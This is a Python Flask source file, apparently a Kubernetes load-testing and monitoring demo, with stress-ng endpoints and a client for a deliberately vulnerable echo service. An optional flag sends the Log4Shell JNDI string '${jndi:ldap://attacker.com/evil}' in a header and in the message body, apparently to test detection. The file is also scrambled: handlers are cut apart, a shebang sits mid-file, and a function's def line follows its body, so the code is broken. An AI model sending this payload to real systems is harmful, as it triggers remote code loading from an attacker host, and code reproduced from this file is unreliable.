@app.route('/echo', methods=['POST'])
def call_echo():
    """Ruft den Echo Service auf"""
    metrics['requests_total'] += 1
    
    try:
        # Parameter aus Form oder JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        message = data.get('message', 'Hello from Load Test!')
        method = data.get('method', 'POST').upper()
        vulnerable_payload = data.get('vulnerable_payload') == 'true'
        
        # Echo Service aufrufen
        result = call_echo_service(message, method, vulnerable_payload)
        
        if request.is_json:
            return jsonify(result)
        else:
            # Web Interface Response
            if result['success']:
                <script>setTimeout(() => window.location.href='/', 3000);</script>
                """
    
    except Exception as e:
        logger.error(f"Fehler beim Echo Service Aufruf: {e}")
        error_response = {'error': str(e)}
        
        if request.is_json:
            return jsonify(error_response), 500
        else:
            return f"""
            <div class="status error">❌ Fehler: {e}</div>
            <script>setTimeout(() => window.location.href='/', 3000);</script>
            """

@app.route('/stress', methods=['POST'])return f"""
                <div class="status success">
                    ✅ Echo Service Response!<br>
                    Method: {method}<br>
                    Message: {message}<br>
                    {'🚨 Vulnerable Payload Sent!' if vulnerable_payload else ''}
                    <br><br>
                    Response: {json.dumps(result['response'], indent=2)}
                </div>
                <script>setTimeout(() => window.location.href='/', 5000);</script>
                """
            else:
                return f"""
                <div class="status error">
                    ❌ Echo Service Error: {result.get('error', 'Unknown error')}<br>
                    Service URL: {echo_service_url}
                </div>
                #!/usr/bin/env python3
"""
Load Testing Application für Turbonomic und Instana Testing
Webserver mit stress-ng Integration für Kubernetes Deployment
"""

import os
import time
import json
import logging
import subprocess
import threading
from datetime import datetime
import instana
from flask import Flask, request, jsonify, render_template_string
from werkzeug.serving import make_server
import psutil

# Logging konfigurieren
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Global variables für Monitoring
current_stress_processes = []
echo_service_url = os.environ.get('ECHO_SERVICE_URL', 'http://vulnerable-echo-service:8085')
metrics = {
    'requests_total': 0,
    'stress_tests_running': 0,
    'echo_requests_total': 0,
    'echo_requests_failed': 0,
    'cpu_usage': 0.0,
    'memory_usage': 0.0,
    'last_stress_duration': 0
}

def get_system_metrics():
    """Sammelt aktuelle System-Metriken"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        
        metrics['cpu_usage'] = cpu_percent
        metrics['memory_usage'] = memory.percent
        
        return {
            'cpu_percent': cpu_percent,
            'memory_percent': memory.percent,
            'memory_available_gb': round(memory.available / (1024**3), 2),
            'memory_total_gb': round(memory.total / (1024**3), 2),
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        logger.error(f"Fehler beim Sammeln von System-Metriken: {e}")
        return {}

def call_echo_service(message, method='POST', vulnerable_payload=False):
    """
    Ruft den vulnerablen Echo Service auf
    """
    global metrics
    
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'LoadTestApp/1.0'
        }
        
        if vulnerable_payload:
            # VULNERABLE PAYLOAD für Log4j Testing
            # Dies wird im Echo Service geloggt und löst die Vulnerability aus
            vulnerable_msg = "${jndi:ldap://attacker.com/evil}"
            headers['X-Vulnerable-Header'] = vulnerable_msg
            message = f"{message} - {vulnerable_msg}"
        
        if method.upper() == 'POST':
            response = requests.post(
                f"{echo_service_url}/echo",
                json={'message': message, 'user_agent': headers['User-Agent']},
                headers=headers,
                timeout=10
            )
        else:
            # GET Request mit message in URL path
            response = requests.get(
                f"{echo_service_url}/echo/{message}",
                headers=headers,
                timeout=10
            )
        
        metrics['echo_requests_total'] += 1
        
        if response.status_code == 200:
            return {
                'success': True,
                'response': response.json(),
                'status_code': response.status_code,
                'method': method,
                'vulnerable_payload': vulnerable_payload
            }
        else:
            metrics['echo_requests_failed'] += 1
            return {
                'success': False,
                'error': f"HTTP {response.status_code}",
                'status_code': response.status_code
            }
            
    except requests.exceptions.RequestException as e:
        metrics['echo_requests_failed'] += 1
        logger.error(f"Echo Service Request failed: {e}")
        return {
            'success': False,
            'error': str(e),
            'service_url': echo_service_url
        }
    """
    Führt stress-ng mit konfigurierbaren Parametern aus
    """
    global current_stress_processes, metrics
    
    try:
        cmd = [
            'stress-ng',
            '--cpu', str(cpu_workers),
            '--vm', str(memory_workers),
            '--vm-bytes', memory_size,
            '--timeout', f'{duration}s',
            '--metrics-brief',
            '--verbose'
        ]
        
        logger.info(f"Starte stress-ng: {' '.join(cmd)}")
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        current_stress_processes.append(process)
        metrics['stress_tests_running'] += 1
        metrics['last_stress_duration'] = duration
        
        # Warte auf Prozess-Ende
        output, _ = process.communicate()
        
        # Entferne aus aktiven Prozessen
        if process in current_stress_processes:
            current_stress_processes.remove(process)
        
        metrics['stress_tests_running'] -= 1
        
        logger.info(f"stress-ng beendet mit Return Code: {process.returncode}")
        return {
            'success': True,
            'return_code': process.returncode,
            'output': output,
            'duration': duration
        }
        
    except FileNotFoundError:
        error_msg = "stress-ng ist nicht installiert. Installiere es mit: apt-get install stress-ng"
        logger.error(error_msg)
        return {'success': False, 'error': error_msg}
    except Exception as e:
        logger.error(f"Fehler beim Ausführen von stress-ng: {e}")
        metrics['stress_tests_running'] = max(0, metrics['stress_tests_running'] - 1)
def run_stress_ng(cpu_workers=2, memory_workers=1, duration=30, memory_size="256M"):

# HTML Template für Web Interface
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Load Testing Application</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .metrics { background: #e8f4f8; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select { padding: 8px; width: 200px; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #007cba; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #005a87; }
        .status { padding: 10px; margin: 10px 0; border-radius: 4px; }
        .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
        .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
        .running { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 Load Testing Application</h1>
        <p>Kubernetes Load Generator für Turbonomic und Instana Testing</p>
        
        <div class="metrics">
            <h3>📊 System Metriken</h3>
            <p><strong>CPU Usage:</strong> {{ metrics.cpu_usage|round(1) }}%</p>
            <p><strong>Memory Usage:</strong> {{ metrics.memory_usage|round(1) }}%</p>
            <p><strong>Aktive Stress Tests:</strong> {{ metrics.stress_tests_running }}</p>
            <p><strong>Echo Requests Total:</strong> {{ metrics.echo_requests_total }}</p>
            <p><strong>Echo Requests Failed:</strong> {{ metrics.echo_requests_failed }}</p>
        </div>

        <form action="/stress" method="post">
            <h3>⚡ Stress Test starten</h3>
            
            <div class="form-group">
                <label for="cpu_workers">CPU Workers:</label>
                <input type="number" id="cpu_workers" name="cpu_workers" value="2" min="1" max="16">
            </div>
            
            <div class="form-group">
                <label for="memory_workers">Memory Workers:</label>
                <input type="number" id="memory_workers" name="memory_workers" value="1" min="1" max="8">
            </div>
            
            <div class="form-group">
                <label for="duration">Dauer (Sekunden):</label>
                <input type="number" id="duration" name="duration" value="30" min="5" max="3600">
            </div>
            
            <div class="form-group">
                <label for="memory_size">Memory Size:</label>
                <select id="memory_size" name="memory_size">
                    <option value="128M">128MB</option>
                    <option value="256M" selected>256MB</option>
                    <option value="512M">512MB</option>
                    <option value="1G">1GB</option>
                </select>
            </div>
            
            <button type="submit">🚀 Stress Test starten</button>
        </form>
        
        <form action="/echo" method="post" style="border-top: 1px solid #ddd; padding-top: 20px; margin-top: 20px;">
            <h3>📢 Echo Service Test</h3>
            
            <div class="form-group">
                <label for="echo_message">Message:</label>
                <input type="text" id="echo_message" name="message" value="Hello from Load Test!" style="width: 300px;">
            </div>
            
            <div class="form-group">
                <label for="echo_method">Method:</label>
                <select id="echo_method" name="method">
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                </select>
            </div>
            
            <div class="form-group">
                <label>
                    <input type="checkbox" name="vulnerable_payload" value="true"> 
                    Include Log4j Vulnerable Payload (for testing)
                </label>
            </div>
            
            <button type="submit" style="background: #dc3545;">📢 Call Echo Service</button>
        </form>
        
        <div style="margin-top: 30px;">
            <h3>🔧 API Endpoints</h3>
            <p><code>GET /health</code> - Health Check</p>
            <p><code>GET /metrics</code> - System Metriken</p>
            <p><code>POST /stress</code> - Stress Test starten</p>
            <p><code>POST /echo</code> - Echo Service aufrufen</p>
            <p><code>GET /status</code> - Aktueller Status</p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    """Hauptseite mit Web Interface"""
    metrics['requests_total'] += 1
    return render_template_string(HTML_TEMPLATE, metrics=metrics)

@app.route('/health')
def health():
    """Health Check Endpoint für Kubernetes"""
    metrics['requests_total'] += 1
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0'
    })

@app.route('/metrics')
def get_metrics():
    """Prometheus-style Metriken für Monitoring"""
    metrics['requests_total'] += 1
    system_metrics = get_system_metrics()
    
    response = {
        'application_metrics': metrics,
        'system_metrics': system_metrics,
        'active_processes': len(current_stress_processes)
    }
    
    return jsonify(response)

@app.route('/stress', methods=['POST'])
def start_stress():
    """Startet einen Stress Test"""
    metrics['requests_total'] += 1
    
    try:
        # Parameter aus Form oder JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        cpu_workers = int(data.get('cpu_workers', 2))
        memory_workers = int(data.get('memory_workers', 1))
        duration = int(data.get('duration', 30))
        memory_size = data.get('memory_size', '256M')
        
        # Validierung
        if duration > 3600:
            return jsonify({'error': 'Maximale Dauer ist 3600 Sekunden (1 Stunde)'}), 400
        
        # Stress Test in separatem Thread starten
        thread = threading.Thread(
            target=run_stress_ng,
            args=(cpu_workers, memory_workers, duration, memory_size)
        )
        thread.daemon = True
        thread.start()
        
        response = {
            'message': 'Stress Test gestartet',
            'parameters': {
                'cpu_workers': cpu_workers,
                'memory_workers': memory_workers,
                'duration': duration,
                'memory_size': memory_size
            },
            'timestamp': datetime.now().isoformat()
        }
        
        if request.is_json:
            return jsonify(response)
        else:
            # Redirect für Web Interface
            return f"""
            <div class="status success">
                ✅ Stress Test gestartet!<br>
                CPU Workers: {cpu_workers}, Memory Workers: {memory_workers}<br>
                Dauer: {duration}s, Memory Size: {memory_size}
            </div>
            <script>setTimeout(() => window.location.href='/', 3000);</script>
            """
    
    except Exception as e:
        logger.error(f"Fehler beim Starten des Stress Tests: {e}")
        error_response = {'error': str(e)}
        
        if request.is_json:
            return jsonify(error_response), 500
        else:
            return f"""
            <div class="status error">❌ Fehler: {e}</div>
            <script>setTimeout(() => window.location.href='/', 3000);</script>
            """

@app.route('/status')
def status():
    """Status Endpoint"""
    metrics['requests_total'] += 1
    
    return jsonify({
        'active_stress_processes': len(current_stress_processes),
        'metrics': metrics,
        'system_info': {
            'cpu_count': psutil.cpu_count(),
            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2)
        },
        'timestamp': datetime.now().isoformat()
    })

@app.route('/stop', methods=['POST'])
def stop_stress():
    """Stoppt alle aktiven Stress Tests"""
    global current_stress_processes
    
    stopped_count = 0
    for process in current_stress_processes[:]:  # Copy list to avoid modification during iteration
        try:
            process.terminate()
            process.wait(timeout=5)
            stopped_count += 1
        except Exception as e:
            logger.error(f"Fehler beim Stoppen des Prozesses: {e}")
    
    current_stress_processes.clear()
    metrics['stress_tests_running'] = 0
    
    return jsonify({
        'message': f'{stopped_count} Stress Tests gestoppt',
        'timestamp': datetime.now().isoformat()
    })

def periodic_metrics_update():
    """Aktualisiert Metriken periodisch"""
    while True:
        try:
            get_system_metrics()
            time.sleep(5)  # Update alle 5 Sekunden
        except Exception as e:
            logger.error(f"Fehler beim Aktualisieren der Metriken: {e}")
            time.sleep(10)

if __name__ == '__main__':
    # Starte Metriken-Thread
    metrics_thread = threading.Thread(target=periodic_metrics_update)
    metrics_thread.daemon = True
    metrics_thread.start()
    
    # Server konfigurieren
    port = int(os.environ.get('PORT', 8080))
    host = os.environ.get('HOST', '0.0.0.0')
    
    logger.info(f"🚀 Starte Load Testing Application auf {host}:{port}")
    logger.info("Verfügbare Endpoints:")
    logger.info("  GET  / - Web Interface")
    logger.info("  GET  /health - Health Check")
    logger.info("  GET  /metrics - System Metriken")
    logger.info("  POST /stress - Stress Test starten")
    logger.info("  GET  /status - Status Information")
    logger.info("  POST /stop - Alle Tests stoppen")
    
    # Produktionsserver für Container
    if os.environ.get('FLASK_ENV') == 'production':
        from waitress import serve
        serve(app, host=host, port=port)
    else:
        app.run(host=host, port=port, debug=False)
